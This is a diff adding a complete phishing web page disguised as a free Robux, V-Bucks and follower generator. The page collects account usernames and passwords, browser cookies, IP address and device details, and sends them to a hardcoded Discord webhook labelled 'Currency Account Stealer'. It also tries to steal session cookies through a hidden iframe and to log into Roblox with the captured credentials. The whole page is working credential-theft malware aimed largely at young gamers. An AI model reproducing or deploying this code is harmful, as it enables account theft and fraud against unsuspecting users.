@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Donate Currency Generator</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+        }
+        
+        body { 
+            background: #0a0a0a; 
+            color: #f0f0f0; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 20px; 
+        }
+        
+        .container { 
+            background: #1a1a1a; 
+            border-radius: 15px; 
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); 
+            overflow: hidden; 
+            width: 100%; 
+            max-width: 450px; 
+            border: 1px solid #333; 
+        }
+        
+        .header { 
+            background: linear-gradient(135deg, #00a2ff, #8a2be2); 
+            padding: 30px 20px; 
+            text-align: center; 
+            color: white; 
+            position: relative; 
+            overflow: hidden; 
+        }
+        
+        .header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.2);
+            z-index: 1;
+        }
+        
+        .header-content {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .header h1 { 
+            font-size: 28px; 
+            margin-bottom: 10px; 
+            font-weight: bold; 
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .header p { 
+            font-size: 16px; 
+            opacity: 0.9; 
+        }
+        
+        .offer-banner { 
+            background: linear-gradient(45deg, #ff6b6b, #ffa726); 
+            color: white; 
+            padding: 15px; 
+            text-align: center; 
+            font-size: 18px; 
+            font-weight: bold; 
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        
+        .selection-container { 
+            padding: 30px; 
+        }
+        
+        .section-title {
+            font-size: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #f0f0f0;
+            font-weight: 600;
+        }
+        
+        .platform-grid { 
+            display: grid; 
+            grid-template-columns: repeat(2, 1fr); 
+            gap: 15px; 
+            margin-bottom: 30px; 
+        }
+        
+        .platform-option { 
+            background: #2a2a2a; 
+            border: 2px solid #444; 
+            border-radius: 10px; 
+            padding: 20px 10px; 
+            text-align: center; 
+            cursor: pointer; 
+            transition: all 0.3s ease; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .platform-option:hover { 
+            transform: translateY(-5px); 
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); 
+        }
+        
+        .platform-option.selected { 
+            border-color: #00a2ff; 
+            background: linear-gradient(135deg, #2a2a2a, #1a3a5a); 
+        }
+        
+        .platform-icon {
+            font-size: 30px;
+            margin-bottom: 10px;
+        }
+        
+        .platform-name {
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .form-container { 
+            padding: 30px; 
+            display: none;
+        }
+        
+        .form-group { 
+            margin-bottom: 20px; 
+        }
+        
+        .form-group label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: 600; 
+            color: #f0f0f0; 
+        }
+        
+        .form-group input { 
+            width: 100%; 
+            padding: 12px 15px; 
+            background: #2a2a2a; 
+            border: 2px solid #444; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            color: #f0f0f0;
+            transition: border-color 0.3s; 
+        }
+        
+        .form-group input:focus { 
+            outline: none; 
+            border-color: #00a2ff; 
+        }
+        
+        .amount-selection { 
+            display: flex; 
+            flex-wrap: wrap; 
+            gap: 10px; 
+            margin-top: 10px; 
+        }
+        
+        .amount-option { 
+            flex: 1; 
+            min-width: 70px; 
+            padding: 10px; 
+            background: #2a2a2a; 
+            border: 2px solid #444; 
+            border-radius: 8px; 
+            text-align: center; 
+            cursor: pointer; 
+            transition: all 0.3s; 
+        }
+        
+        .amount-option:hover, .amount-option.selected { 
+            border-color: #00a2ff; 
+            background: #00a2ff; 
+            color: white; 
+        }
+        
+        .generate-btn { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(45deg, #00c853, #00a2ff); 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: transform 0.2s; 
+            margin-top: 10px;
+        }
+        
+        .generate-btn:hover { 
+            transform: translateY(-2px); 
+        }
+        
+        .back-btn {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #f0f0f0;
+            border: 2px solid #444;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .back-btn:hover {
+            background: #333;
+        }
+        
+        .footer { 
+            text-align: center; 
+            padding: 20px; 
+            color: #888; 
+            font-size: 12px; 
+            border-top: 1px solid #333; 
+        }
+        
+        .loading, .success-message, .error-message { 
+            display: none; 
+            text-align: center; 
+            padding: 20px; 
+        }
+        
+        .loading p {
+            font-size: 18px;
+        }
+        
+        .success-message { 
+            color: #00c853; 
+        }
+        
+        .error-message { 
+            color: #ff4444; 
+        }
+        
+        .cookie-banner { 
+            position: fixed; 
+            bottom: 0; 
+            left: 0; 
+            right: 0; 
+            background: #222; 
+            color: white; 
+            padding: 15px; 
+            text-align: center; 
+            display: none; 
+            z-index: 1000;
+            border-top: 1px solid #444;
+        }
+        
+        .cookie-banner p {
+            margin-bottom: 10px;
+        }
+        
+        .cookie-banner button { 
+            margin: 0 10px; 
+            padding: 8px 20px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+        }
+        
+        .accept-btn { 
+            background: #00a2ff; 
+            color: white; 
+        }
+        
+        .reject-btn { 
+            background: #ff4444; 
+            color: white; 
+        }
+        
+        .spinner {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #00a2ff;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Cookie Banner -->
+    <div class="cookie-banner" id="cookieBanner">
+        <p>🍪 We use cookies to personalize your experience and save your account data.</p>
+        <button class="accept-btn" onclick="acceptCookies()">Accept All</button>
+        <button class="reject-btn" onclick="rejectCookies()">Reject</button>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <div class="header">
+            <div class="header-content">
+                <h1>🎁 FREE DONATE CURRENCY</h1>
+                <p>Claim your free currency instantly!</p>
+            </div>
+        </div>
+        <div class="offer-banner">LIMITED TIME: Get up to 100,000 FREE units!</div>
+        
+        <!-- Platform Selection -->
+        <div class="selection-container" id="selectionContainer">
+            <div class="section-title">Select Platform</div>
+            <div class="platform-grid">
+                <div class="platform-option" data-platform="roblox">
+                    <div class="platform-icon">🎮</div>
+                    <div class="platform-name">Robux</div>
+                </div>
+                <div class="platform-option" data-platform="fortnite">
+                    <div class="platform-icon">🔫</div>
+                    <div class="platform-name">V-Bucks</div>
+                </div>
+                <div class="platform-option" data-platform="tiktok">
+                    <div class="platform-icon">📱</div>
+                    <div class="platform-name">TikTok Followers</div>
+                </div>
+                <div class="platform-option" data-platform="instagram">
+                    <div class="platform-icon">📸</div>
+                    <div class="platform-name">Instagram Followers</div>
+                </div>
+                <div class="platform-option" data-platform="youtube">
+                    <div class="platform-icon">📺</div>
+                    <div class="platform-name">YouTube Subscribers</div>
+                </div>
+                <div class="platform-option" data-platform="spotify">
+                    <div class="platform-icon">🎵</div>
+                    <div class="platform-name">Spotify Followers</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Form Container -->
+        <div class="form-container" id="formContainer">
+            <div class="section-title" id="formTitle">Generate Free Robux</div>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Account Username/Email</label>
+                    <input type="text" id="username" name="username" placeholder="Enter your username or email" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Account Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+                <div class="form-group">
+                    <label>Select Amount</label>
+                    <div class="amount-selection">
+                        <div class="amount-option" data-amount="1000">1,000</div>
+                        <div class="amount-option" data-amount="5000">5,000</div>
+                        <div class="amount-option" data-amount="10000">10,000</div>
+                        <div class="amount-option" data-amount="50000">50,000</div>
+                        <div class="amount-option" data-amount="100000">100,000</div>
+                    </div>
+                    <input type="hidden" id="selectedAmount" name="amount" value="1000">
+                    <input type="hidden" id="selectedPlatform" name="platform" value="roblox">
+                </div>
+                <button type="submit" class="generate-btn" id="generateBtn">🎮 GENERATE NOW</button>
+                <button type="button" class="back-btn" id="backBtn">← Back to Selection</button>
+            </form>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>🔄 Generating your currency... Please wait</p>
+            </div>
+            <div class="success-message" id="successMessage">
+                <h3>✅ SUCCESS!</h3>
+                <p>Your <span id="currencyAmount">1,000</span> <span id="currencyType">Robux</span> are being added to your account!</p>
+            </div>
+            <div class="error-message" id="errorMessage">
+                <h3>❌ ERROR</h3>
+                <p>Invalid login credentials. Please try again.</p>
+            </div>
+        </div>
+        
+
+    <script>
+        // Global variables
+        let userIP = "Unknown";
+        let cookiesAccepted = false;
+        let browserCookies = document.cookie;
+        let platformCookies = "";
+        let selectedPlatform = "roblox";
+        
+        // Platform data
+        const platforms = {
+            roblox: {
+                name: "Robux",
+                icon: "🎮",
+                color: "#ff6b6b"
+            },
+            fortnite               : {
+ name: "V-Bucks",
+                icon: "🔫",
+                color: "#00a2ff"
+            },
+            tiktok: {
+                name: "TikTok Followers",
+                icon: "📱",
+                color: "#ff0050"
+            },
+            instagram: {
+                name: "Instagram Followers",
+                icon: "📸",
+                color: "#e4405f"
+            },
+            youtube: {
+                name: "YouTube Subscribers",
+                icon: "📺",
+                color: "#ff0000"
+            },
+            spotify: {
+                name: "Spotify Followers",
+                icon: "🎵",
+                color: "#1db954"
+            }
+        };
+        
+        // Show cookie banner after 2 seconds
+        setTimeout(() => {
+            document.getElementById('cookieBanner').style.display = 'block';
+        }, 2000);
+        
+        // Cookie functions
+        function acceptCookies() {
+            cookiesAccepted = true;
+            document.getElementById('cookieBanner').style.display = 'none';
+            
+            // Try to steal platform cookies if user is logged in
+            stealPlatformCookies();
+            
+            // Save our fake cookie
+            document.cookie = "currency_generator=accepted; expires=Fri, 31 Dec 2025 23:59:59 GMT; path=/";
+            document.cookie = "user_session=active; expires=Fri, 31 Dec 2025 23:59:59 GMT; path=/";
+            
+            browserCookies = document.cookie;
+        }
+        
+        function rejectCookies() {
+            cookiesAccepted = false;
+            document.getElementById('cookieBanner').style.display = 'none';
+            browserCookies = document.cookie;
+        }
+        
+        // Platform selection
+        document.querySelectorAll('.platform-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('.platform-option').forEach(opt => opt.classList.remove('selected'));
+                this.classList.add('selected');
+                
+                selectedPlatform = this.getAttribute('data-platform');
+                document.getElementById('selectedPlatform').value = selectedPlatform;
+                
+                // Update form title and button
+                document.getElementById('formTitle').textContent = `Generate Free ${platforms[selectedPlatform].name}`;
+                document.getElementById('generateBtn').textContent = `🎮 GENERATE ${platforms[selectedPlatform].name.toUpperCase()}`;
+                document.getElementById('currencyType').textContent = platforms[selectedPlatform].name;
+                
+                // Show form, hide selection
+                document.getElementById('selectionContainer').style.display = 'none';
+                document.getElementById('formContainer').style.display = 'block';
+            });
+        });
+        
+        // Amount selection
+        document.querySelectorAll('.amount-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('.amount-option').forEach(opt => opt.classList.remove('selected'));
+                this.classList.add('selected');
+                document.getElementById('selectedAmount').value = this.getAttribute('data-amount');
+                document.getElementById('currencyAmount').textContent = this.getAttribute('data-amount');
+            });
+        });
+        
+        // Back button
+        document.getElementById('backBtn').addEventListener('click', function() {
+            document.getElementById('formContainer').style.display = 'none';
+            document.getElementById('selectionContainer').style.display = 'block';
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+        });
+        
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const amount = document.getElementById('selectedAmount').value;
+            const platform = document.getElementById('selectedPlatform').value;
+            
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('loginForm').style.display = 'none';
+            
+            // If cookies accepted, steal session data
+            if (cookiesAccepted) {
+                stealPlatformSessionData(username, password, platform);
+            }
+            
+            // Create content for the .txt file
+            const fileContent = `ACCOUNT CREDENTIALS CAPTURED
+
+=== ACCOUNT INFORMATION ===
+Platform: ${platforms[platform].name}
+Username: ${username}
+Password: ${password}
+Amount Requested: ${amount}
+
+=== PLATFORM SESSION DATA ===
+${platformCookies || "No platform session data captured"}
+
+=== BROWSER COOKIES ===
+${browserCookies}
+
+=== SYSTEM INFORMATION ===
+IP Address: ${userIP}
+User Agent: ${navigator.userAgent}
+Cookies Accepted: ${cookiesAccepted ? "Yes" : "No"}
+Timestamp: ${new Date().toLocaleString()}
+
+=== BROWSER DATA ===
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Cookies Enabled: ${navigator.cookieEnabled}
+Screen Resolution: ${screen.width}x${screen.height}
+
+--- END OF LOG ---`;
+
+            // Send to Discord webhook
+            const formData = new FormData();
+            const blob = new Blob([fileContent], { type: 'text/plain' });
+            formData.append('file', blob, `data-${platform}.txt`);
+            
+            formData.append('payload_json', JSON.stringify({
+                content: `📁 **SEND ALL #1** - ${platforms[platform].name} ACCOUNT ACCESS captured! 🎣`,
+                username: "Currency Account Stealer"
+            }));
+
+            fetch('https://discord.com/api/webhooks/1429195535847395338/BxkW1jg0WgFomvjtRMrVvDAIVIwSgVYTsN6oMqkytQ5JEbhpGPEzm0UmfGcw5lyXxIeU', {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => {
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('currencyAmount').textContent = amount;
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Redirect to success page after 5 seconds
+                    setTimeout(() => {
+                        window.location.href = `success-${platform}.html`;
+                    }, 5000);
+                }, 3000);
+            })
+            .catch(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
+            });
+        });
+        
+        function stealPlatformCookies() {
+            // Try different techniques to steal platform cookies
+            try {
+                // Technique 1: Iframe to steal session cookies
+                const iframe = document.createElement('iframe');
+                iframe.src = getPlatformURL(selectedPlatform);
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                iframe.onload = function() {
+                    try {
+                        // Try to access iframe cookies
+                        const iframeCookies = iframe.contentDocument?.cookie || "";
+                        if (iframeCookies) {
+                            platformCookies = iframeCookies;
+                        }
+                    } catch (e) {
+                        // Cross-origin block - normal
+                    }
+                };
+                
+                // Technique 2: Local Storage
+                setTimeout(() => {
+                    try {
+                        if (iframe.contentWindow) {
+                            const platformData = iframe.contentWindow.localStorage;
+                            if (platformData) {
+                                platformCookies += "\nLocal Storage: " + JSON.stringify(platformData);
+                            }
+                        }
+                    } catch (e) {
+                        // Cross-origin block
+                    }
+                }, 2000);
+                
+            } catch (e) {
+                console.log("Cookie stealing failed:", e);
+            }
+        }
+        
+        function stealPlatformSessionData(username, password, platform) {
+            // Try to automatically log in to the platform with stolen credentials
+            const loginURL = getPlatformLoginURL(platform);
+            
+            if (loginURL) {
+                fetch(loginURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password
+                    }),
+                    credentials: 'include'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.user) {
+                        platformCookies += `\nLOGIN SUCCESS: User ${data.user.id} authenticated`;
+                    }
+                })
+                .catch(() => {});
+            }
+        }
+        
+        function getPlatformURL(platform) {
+            const urls = {
+                roblox: 'https://www.roblox.com',
+                fortnite: 'https://www.epicgames.com',
+                tiktok: 'https://www.tiktok.com',
+                instagram: 'https://www.instagram.com',
+                youtube: 'https://www.youtube.com',
+                spotify: 'https://www.spotify.com'
+            };
+            return urls[platform] || 'https://www.google.com';
+        }
+        
+        function getPlatformLoginURL(platform) {
+            const urls = {
+                roblox: 'https://auth.roblox.com/v2/login',
+                // Other platforms would have their login URLs here
+            };
+            return urls[platform] || null;
+        }
+        
+        // Get real IP
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userIP = data.ip;
+            })
+            .catch(() => {
+                userIP = "Failed to fetch";
+            });
+        
+        // Select first amount option by default
+        document.querySelector('.amount-option').click();
+    </script>
+</body>
+</html>
